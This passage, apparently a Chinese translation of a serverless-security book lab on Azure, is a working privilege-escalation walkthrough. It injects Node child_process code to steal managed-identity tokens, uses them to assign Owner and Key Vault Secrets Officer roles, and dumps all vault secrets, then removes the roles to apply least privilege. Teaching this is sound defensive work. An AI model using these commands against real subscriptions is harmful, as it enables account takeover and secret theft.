  \ || 用于刷新/重新验证令牌的内部声明 |\n\n| `sub` || 令牌的主体 |\n\n| `tid` || 用户登录的租户 |\n\n| `uti`\
  \ || 唯一令牌标识符 |\n\n| `ver` || 令牌的版本 |\n\n9. 通过运行以下命令检索对象 ID，或 OID（主体 ID）：\n\n```\n\
  echo $ACCESS_TOKEN | cut -d \".\" -f2 | base64 --decode | jq -r '.oid'\n```\n\n\
  或者，如果在运行上一个命令时遇到 `base64: invalid input` 错误，您可以运行以下命令：\n\n\n\n\n\n```\nPAYLOAD=$(echo\
  \ $ACCESS_TOKEN | cut -d \".\" -f2)\nFIXED=$(echo \"$PAYLOAD\" | tr '_-' '/+' |\
  \ \\\n    awk '{printf \"%s%s\", $0, substr(\"===\", (length($0)%4)+1)}')\n\necho\
  \ \"$FIXED\" | base64 --decode 2>/dev/null | jq -r '.oid'\n```\n\n##### 10. 将检索到的\
  \ OID（主体 ID）存储到环境变量（`PRINCIPAL_ID`）中：\n\n```\nPRINCIPAL_ID=\"[SPECIFY OID VALUE]\"\
  \n```\n\n#### Caution\n\n在运行命令之前，请确保将 `[SPECIFY OID VALUE]` 替换为适当的 `oid` 值。\n\n\
  ##### 11. 检索 Owner 角色 ID 并将其存储到环境变量（`OWNER_ROLE_ID`）中：\n\n```\nOWNER_ROLE_ID=$(az\
  \ role definition list --name \"Owner\" \\\n    --query \"[].id\" -o tsv)\n\necho\
  \ $OWNER_ROLE_ID\n```\n\n这会给出类似如下的输出值：\n\n```\n/subscriptions/.../providers/Microsoft.Authorization/roleDefinitions/...\n\
  ```\n\n##### 12. 生成一个唯一标识符并将结果值存储到环境变量（`ROLE_ASSIGNMENT_ID`）中：\n\n```\nROLE_ASSIGNMENT_ID=$(uuidgen)\n\
  ```\n\n##### 13. 将 Owner 角色分配给无服务器函数的托管标识：\n\n```\nURL_1=\"https://management.azure.com/subscriptions/$SUBSCRIPTION_ID\"\
  \nURL_2=\"providers/Microsoft.Authorization\"\nURL_3=\"roleAssignments/$ROLE_ASSIGNMENT_ID?api-version=2022-04-01\"\
  \n\nURL=\"$URL_1/$URL_2/$URL_3\"\n\ncurl -X PUT $URL \\\n     -H \"Authorization:\
  \ Bearer $ACCESS_TOKEN\" \\\n     -H \"Content-Type: application/json\" \\\n   \
  \  -d \"{\n           \\\"properties\\\": {\n             \\\"roleDefinitionId\\\
  \": \\\"$OWNER_ROLE_ID\\\",\n             \\\"principalId\\\": \\\"$PRINCIPAL_ID\\\
  \"\n           }\n         }\"\n```\n\n#### Note\n\n由于托管标识已被授予 User Access Administrator\
  \ 角色，因此拥有其访问令牌的攻击者可以将其权限提升为 Owner（或其他任何角色）。\n\n##### 14. 检查 Key Vault Secrets Officer\
  \ 角色的详细信息以查看其权限和范围：\n\n```\naz role definition list --name \"Key Vault Secrets Officer\"\
  \ -o json\n```\n\n这会产生以下输出：\n\n```\n[\n  {\n    \"assignableScopes\": [\n      \"\
  /\"\n    ],\n    \"createdBy\": null,\n    \"createdOn\": \"2020-05-19T17:52:47.144924+00:00\"\
  ,\n    \"description\": \"Perform any action on the secrets of a key vault...\"\
  ,\n    \"id\": \".../roleDefinitions/b86a8fe4-44ce-4948-aee5-eccb2c155cd7\",\n \
  \   \"name\": \"b86a8fe4-44ce-4948-aee5-eccb2c155cd7\",\n    \"permissions\": [\n\
  \      {\n        \"actions\": [\n          \"Microsoft.Authorization/*/read\",\n\
  \          \"Microsoft.Insights/alertRules/*\",\n          \"Microsoft.Resources/deployments/*\"\
  ,\n          \"Microsoft.Resources/subscriptions/resourceGroups/read\",\n      \
  \    \"Microsoft.Support/*\",\n          \"Microsoft.KeyVault/checkNameAvailability/read\"\
  ,\n          \"Microsoft.KeyVault/deletedVaults/read\",\n          \"Microsoft.KeyVault/locations/*/read\"\
  ,\n          \"Microsoft.KeyVault/vaults/*/read\",\n          \"Microsoft.KeyVault/operations/read\"\
  \n        ],\n        \"condition\": null,\n        \"conditionVersion\": null,\n\
  \        \"dataActions\": [\n          \"Microsoft.KeyVault/vaults/secrets/*\"\n\
  \        ],\n        \"notActions\": [],\n        \"notDataActions\": []\n     \
  \ }\n    ],\n    \"roleName\": \"Key Vault Secrets Officer\",\n    \"roleType\"\
  : \"BuiltInRole\",\n    \"type\": \"Microsoft.Authorization/roleDefinitions\",\n\
  \    \"updatedBy\": null,\n    \"updatedOn\": \"2021-11-11T20:14:30.779347+00:00\"\
  \n  }\n]\n```\n\n在此，使用 Key Vault Secrets Officer 角色的主体可以对 Key Vault 的密钥执行任何操作，但管理权限除外。\n\
  \n##### 15. 检索 Key Vault Secrets Officer 角色定义 ID 并将其存储到环境变量（`ROLE_DEFINITION_ID`）中：\n\
  \n```\nROLE_DEFINITION_DETAILS=$(az role definition list \\\n  --name \"Key Vault\
  \ Secrets Officer\" -o json)\n\nROLE_DEFINITION_ID=$(echo $ROLE_DEFINITION_DETAILS\
  \ | jq -r '.[0].id')\necho $ROLE_DEFINITION_ID\n```\n\n##### 16. 生成一个唯一标识符并将结果值存储到环境变量（`ROLE_ASSIGNMENT_ID`）中：\n\
  \n```\nROLE_ASSIGNMENT_ID=$(uuidgen)\n```\n\n##### 17. 将 Key Vault Secrets Officer\
  \ 角色分配给 Azure 函数的托管标识：\n\n```\nURL_1=\"https://management.azure.com/subscriptions/$SUBSCRIPTION_ID\"\
  \nURL_2=\"resourceGroups/$RESOURCE_GROUP/providers\"\nURL_3=\"Microsoft.KeyVault/vaults/$KEYVAULT_NAME\"\
  \nURL_4=\"providers/Microsoft.Authorization\"\nURL_5=\"roleAssignments/$ROLE_ASSIGNMENT_ID?api-version=2022-04-01\"\
  \n\nURL=\"$URL_1/$URL_2/$URL_3/$URL_4/$URL_5\"\n\ncurl -X PUT $URL \\\n     -H \"\
  Authorization: Bearer $ACCESS_TOKEN\" \\\n     -H \"Content-Type: application/json\"\
  \ \\\n     -d \"{\n           \\\"properties\\\": {\n             \\\"roleDefinitionId\\\
  \": \\\"$ROLE_DEFINITION_ID\\\",\n             \\\"principalId\\\": \\\"$PRINCIPAL_ID\\\
  \"\n           }\n         }\"\n```\n\n由于命令中使用的 `PRINCIPAL_ID` 对应于无服务器函数的托管标识的 OID，因此该角色分配授予该标识根据\
  \ Key Vault Secrets Officer 角色的权限对 Key Vault 密钥执行操作的能力。\n\n#### Note\n\n鉴于托管标识已被授予\
  \ User Access Administrator 和 Owner 角色，因此拥有其访问令牌的攻击者可以为其分配 Key Vault Secrets Officer\
  \ 角色（或其他任何角色）。如果你想知道为什么需要单独分配 Key Vault Secrets Officer 角色，那是因为 Owner 角色仅授予对 Key\
  \ Vault 资源的管理平面管理权限（不包括访问其中的密钥）。要读取或修改密钥（数据平面操作），托管标识还需要 Key Vault 特定角色，例如 Key Vault\
  \ Secrets Officer。\n\n让我们快速回顾一下你目前所拥有的内容。如 Figure 12-2 所示，你有一个无服务器函数，其托管标识关联了以下角色：Contributor、User\
  \ Access Administrator、Owner 和 Key Vault Secrets Officer。\n\n![](img/lsse_1202.png)\n\
  \n由于函数应用的托管标识现在具有访问 Key Vault 密钥的权限，你将能够通过泄露的访问令牌直接检索密钥。此外，由于托管标识拥有 Owner 级别权限，因此获得其访问令牌的攻击者可以执行控制平面操作，例如分配或修改角色，从而可能被利用以获得数据平面访问权限。这意味着攻击者还可以使用托管标识访问\
  \ Serverless Lab 账户中的其他 Azure 资源，其影响范围取决于资源范围和角色分配。\n\n##### 1. 准备就绪后，让我们运行 `tester.rb`\
  \ 脚本：\n\n```\nruby tester.rb\n```\n\n##### 2. 在脚本的 REPL 中输入 `Enter an expression\
  \ (or type 'exit' to quit)` 之后，作为单行运行此命令以使用托管标识获取访问令牌。将输出值（`[OUTPUT RESPONSE]` 之后的部分）复制到本地文本文件（TAG：`ACCESS_TOKEN`）：\n\
  \n```\nrequire(\"child_process\").execSync(\n   `curl -s -H \"X-IDENTITY-HEADER:\
  \ ${process.env.IDENTITY_HEADER}\"\n   \"${process.env.IDENTITY_ENDPOINT}\n   ?resource=https://management.azure.com/&api-version=2019-08-01\"\
  `,\n   { encoding: \"utf8\" }\n);\n```\n\n作为单行运行此命令以使用托管标识获取另一个访问令牌。将输出值（`[OUTPUT\
  \ RESPONSE]` 之后的部分）复制到本地文本文件（TAG：`ACCESS_TOKEN_2`）：\n\n\n\n\n\n```\nrequire(\"child_process\"\
  ).execSync(\n   `curl -s -H \"X-IDENTITY-HEADER: ${process.env.IDENTITY_HEADER}\"\
  \n   \"${process.env.IDENTITY_ENDPOINT}\n   ?resource=https://vault.azure.net/&api-version=2019-08-01\"\
  `,\n   { encoding: \"utf8\" }\n);\n```\n\n这会产生以下 JSON 输出：\n\n```\n{\n  \"access_token\"\
  : \"...\",\n  \"expires_on\": \"...\",\n  \"resource\": \"https://vault.azure.net/\"\
  ,\n  \"token_type\": \"Bearer\",\n  \"client_id\": \"...\"\n}\n```\n\n#### Note\n\
  \n此时，你本地机器中的参考文本文件应包含以下额外值：`ACCESS_TOKEN`、`ACCESS_TOKEN_2`。\n\n输入 `exit` 并按 Enter\
  \ 停止脚本并返回到命令行。\n\n3. 从你的参考文本文件中复制第一个访问令牌值（TAG：`ACCESS_TOKEN`）并将其存储在 Cloud Shell\
  \ 终端中的环境变量（`ACCESS_TOKEN`）中：\n\n```\nACCESS_TOKEN=\"[SPECIFY ACCESS TOKEN]\"\n```\n\
  \n4. 从你的参考文本文件中复制第二个访问令牌值（TAG：`ACCESS_TOKEN_2`）并将其存储在 Cloud Shell 终端中的环境变量（`ACCESS_TOKEN_2`）中：\n\
  \n```\nACCESS_TOKEN_2=\"[SPECIFY ACCESS TOKEN]\"\n```\n\n5. 使用第一个获取的访问令牌（`ACCESS_TOKEN`）查询所有\
  \ Key Vault：\n\n```\nURL_1=\"https://management.azure.com/subscriptions/$SUBSCRIPTION_ID\"\
  \nURL_2=\"providers/Microsoft.KeyVault/vaults?api-version=2022-07-01\"\nURL=\"$URL_1/$URL_2\"\
  \n\nRESPONSE=$(curl -s -H \"Authorization: Bearer $ACCESS_TOKEN\" \\\n     -H \"\
  Content-Type: application/json\" \\\n     \"$URL\")\n\necho $RESPONSE | jq \".\"\
  \n```\n\n这会产生以下输出：\n\n```\n{\n  \"value\": [\n    {\n      \"id\": \"/.../vaults/keyvault...\"\
  ,\n      \"name\": \"keyvault...\",\n      \"type\": \"Microsoft.KeyVault/vaults\"\
  ,\n      \"location\": \"eastus\",\n      \"tags\": {},\n      \"systemData\": {...},\n\
  \      \"properties\": {\n        \"sku\": {\n          \"family\": \"A\",\n   \
  \       \"name\": \"standard\"\n        },\n        \"tenantId\": \"...\",\n   \
  \     \"accessPolicies\": [],\n        \"enabledForDeployment\": false,\n      \
  \  \"enableSoftDelete\": true,\n        \"softDeleteRetentionInDays\": 90,\n   \
  \     \"enableRbacAuthorization\": true,\n        \"vaultUri\": \"...\",\n     \
  \   \"provisioningState\": \"Succeeded\",\n        \"publicNetworkAccess\": \"Enabled\"\
  \n      }\n    }\n  ],\n  \"nextLink\": \"...\"\n```\n\n6. 从响应中提取 Key Vault 名称并将其存储在环境变量（`KEYVAULT_NAME`）中：\n\
  \n```\nKEYVAULT_NAME=$(echo $RESPONSE | jq -r \".value.[].name\")\n```\n\n7. 使用另一个访问令牌（`ACCESS_TOKEN_2`）列出\
  \ Key Vault 中的所有机密：\n\n```\ncurl -s -H \"Authorization: Bearer $ACCESS_TOKEN_2\"\
  \ \\\n     -H \"Content-Type: application/json\" \\\n     \"https://${KEYVAULT_NAME}.vault.azure.net/secrets?api-version=7.5\"\
  \ \\\n     | jq .\n```\n\n这会产生以下 JSON 输出：\n\n```\n{\n  \"value\": [\n    {\n   \
  \   \"id\": \"https://keyvault....vault.azure.net/secrets/secret00\",\n      \"\
  attributes\": {\n        \"enabled\": true,\n        \"created\": ...,\n       \
  \ \"updated\": ...,\n        \"recoveryLevel\": \"Recoverable+Purgeable\",\n   \
  \     \"recoverableDays\": 90\n      },\n      \"tags\": {\n        \"file-encoding\"\
  : \"utf-8\"\n      }\n    },\n    {\n      \"id\": \"https://keyvault....vault.azure.net/secrets/secret01\"\
  ,\n      \"attributes\": {\n        \"enabled\": true,\n        \"created\": ...,\n\
  \        \"updated\": ...,\n        \"recoveryLevel\": \"Recoverable+Purgeable\"\
  ,\n        \"recoverableDays\": 90\n      },\n      \"tags\": {\n        \"file-encoding\"\
  : \"utf-8\"\n      }\n    }\n  ],\n  \"nextLink\": null\n}\n```\n\n8. 使用第二个访问令牌（`ACCESS_TOKEN_2`）从\
  \ Key Vault 中检索所有机密：\n\n```\nSECRETS_RESPONSE=$(curl -s -H \"Authorization: Bearer\
  \ $ACCESS_TOKEN_2\" \\\n     -H \"Content-Type: application/json\" \\\n     \"https://${KEYVAULT_NAME}.vault.azure.net/secrets?api-version=7.5\"\
  )\n\nfor SECRET_ID in $(echo \"$SECRETS_RESPONSE\" | jq -r '.value[].id'); do\n\
  \    curl -s -H \"Authorization: Bearer $ACCESS_TOKEN_2\" \\\n         -H \"Content-Type:\
  \ application/json\" \\\n         \"${SECRET_ID}?api-version=7.5\" | jq '{name:\
  \ .id, value: .value}'\ndone\n```\n\n这会以类似以下格式输出机密值：\n\n```\n{\n  \"name\": \"https://keyvault....vault.azure.net/secrets/secret00/...\"\
  ,\n  \"value\": \"SECRETABC123\"\n}\n{\n  \"name\": \"https://keyvault....vault.azure.net/secrets/secret01/...\"\
  ,\n  \"value\": \"SECRETDEF456\"\n}\n```\n\n使用被窃取的访问令牌，你能够修改托管标识的角色分配，赋予其所有者和 Key\
  \ Vault 机密管理员权限，并访问 Key Vault 中存储的机密。此时，你应该对过度宽松的托管标识如何被用来提升权限并危害敏感资源有很好的了解。\n\n\
  从防御安全角度来看，你应为托管标识和服务主体强制执行最小权限，限制角色分配范围，并监控控制平面活动，以便快速检测和补救滥用情况。你将在下一节中对函数应用关联的托管标识强制执行最小权限。\n\
  \n### 对函数应用托管标识应用最小权限\n\n在本节中，你将通过审查和调整先前授予函数应用托管标识的角色分配，来应用最小权限原则。在确保配置安全后，你将运行一系列恶意测试输入，以确认函数按预期安全地拒绝它们。这类似于将门禁卡限制为员工实际需要访问的房间或楼层，以降低未经授权进入的风险。\n\
  \n让我们逐步进行为无服务器函数关联的托管标识强制执行最小权限的步骤：\n\n1. 切换回浏览器窗口和 Serverless Lab 账户的 Cloud Shell\
  \ 终端。\n\n2. 通过加载环境变量并运行以下命令，获取函数应用托管标识的主体 ID：\n\n```\nsource ~/vulnerable-function/function-vars.sh\n\
  \nDETAILS=$(az functionapp identity show \\\n  --name $FUNCTION_APP \\\n  --resource-group\
  \ $RESOURCE_GROUP)\n\nPRINCIPAL_ID=$(echo $DETAILS | jq -r \".principalId\")\n```\n\
  \n#### Tip\n\n运行 `echo $PRINCIPAL_ID` 以打印主体 ID 并确保其已成功检索。\n\n3. 列出函数应用托管标识的所有角色分配以验证其当前权限：\n\
  \n```\naz role assignment list \\\n  --assignee $PRINCIPAL_ID \\\n  --all \\\n \
  \ -o table\n```\n\n这会返回以下值表：\n\n```\nPrincipal  Role                       Scope\n\
  ---------  -------------------------  -------------------------\n...        Contributor\
  \                /subscriptions/...\n...        User Access Administrator  /subscriptions/...\n\
  ...        Owner                      /subscriptions/...\n...        Key Vault Secrets\
  \ Officer  /.../vaults/keyvault...\n```\n\n4. 以 JSON 格式列出函数应用托管标识的所有角色分配，然后仅显示主体\
  \ ID、角色和范围：\n\n```\naz role assignment list \\\n  --assignee $PRINCIPAL_ID \\\n\
  \  --all \\\n  -o json | \\\n  jq '[.[] |\n        { principal: .principalId,\n\
  \          role: .roleDefinitionName,\n          scope: .scope }]'\n```\n\n这会返回以下内容：\n\
  \n\n\n\n\n```\n[\n  {\n    \"principal\": \"...\",\n    \"role\": \"Contributor\"\
  ,\n    \"scope\": \"/subscriptions/...\"\n  },\n  {\n    \"principal\": \"...\"\
  ,\n    \"role\": \"User Access Administrator\",\n    \"scope\": \"/subscriptions/...\"\
  \n  },\n  {\n    \"principal\": \"...\",\n    \"role\": \"Owner\",\n    \"scope\"\
  : \"/subscriptions/...\"\n  },\n  {\n    \"principal\": \"...\",\n    \"role\":\
  \ \"Key Vault Secrets Officer\",\n    \"scope\": \"/.../vaults/keyvault...\"\n \
  \ }\n]\n```\n\n5. 将托管标识的完整角色分配列表存储到环境变量（`ASSIGNMENT_LIST_FULL`）中：\n\n```\nASSIGNMENT_LIST_FULL=$(az\
  \ role assignment list \\\n  --assignee $PRINCIPAL_ID \\\n  --all \\\n  -o json)\n\
  \nASSIGNMENT_LIST=$(echo $ASSIGNMENT_LIST_FULL | \\\n  jq '[.[] |\n        { principal:\
  \ .principalId,\n          role: .roleDefinitionName,\n          scope: .scope }]')\n\
  \necho $ASSIGNMENT_LIST | jq .\n```\n\n这会产生以下输出响应：\n\n```\n[\n  {\n    \"principal\"\
  : \"...\",\n    \"role\": \"Contributor\",\n    \"scope\": \"/subscriptions/...\"\
  \n  },\n  {\n    \"principal\": \"...\",\n    \"role\": \"User Access Administrator\"\
  ,\n    \"scope\": \"/subscriptions/...\"\n  },\n  {\n    \"principal\": \"...\"\
  ,\n    \"role\": \"Owner\",\n    \"scope\": \"/subscriptions/...\"\n  },\n  {\n\
  \    \"principal\": \"...\",\n    \"role\": \"Key Vault Secrets Officer\",\n   \
  \ \"scope\": \".../vaults/keyvault...\"\n  }\n]\n```\n\n6. 遍历 `ASSIGNMENT_LIST`\
  \ 中的每个角色分配并删除托管标识对应的角色分配：\n\n```\necho \"$ASSIGNMENT_LIST\" | jq -c '.[]' | while\
  \ read assignment; do\n    PRINCIPAL=$(echo \"$assignment\" | jq -r '.principal')\n\
  \    ROLE=$(echo \"$assignment\" | jq -r '.role')\n    SCOPE=$(echo \"$assignment\"\
  \ | jq -r '.scope')\n\n    echo \"Deleting role assignment: $ROLE for principal\
  \ $PRINCIPAL on $SCOPE\"\n\n    az role assignment delete \\\n        --assignee\
  \ \"$PRINCIPAL\" \\\n        --role \"$ROLE\" \\\n        --scope \"$SCOPE\"\ndone\n\
  ```\n\n这会产生以下日志输出：\n\n```\nDeleting role assignment: Contributor for principal ...\n\
  on /subscriptions/...\nDeleting role assignment: User Access Administrator for principal\
  \ ...\non /subscriptions/...\nDeleting role assignment: Owner for principal ...\n\
  on /subscriptions/...\nDeleting role assignment: Key Vault Secrets Officer for principal\
  \ ...\non /subscriptions/.../resourceGroups/rg-serverless-security-lab\n/providers/Microsoft.KeyVault/vaults/keyvault...\n\
  ```\n\n#### Tip\n\n在实践中，团队可能会犹豫修改资源权限，因为错误更改可能会破坏应用程序。建议仔细审查无服务器应用程序中每个资源的最小必需权限，先在开发或暂存环境中测试更改，并使用自动化脚本或\
  \ IaC 来强制执行一致且安全的角色分配。^1\n\n7. 再次列出托管标识的所有角色分配，以验证角色分配已成功移除：\n\n```\naz role assignment\
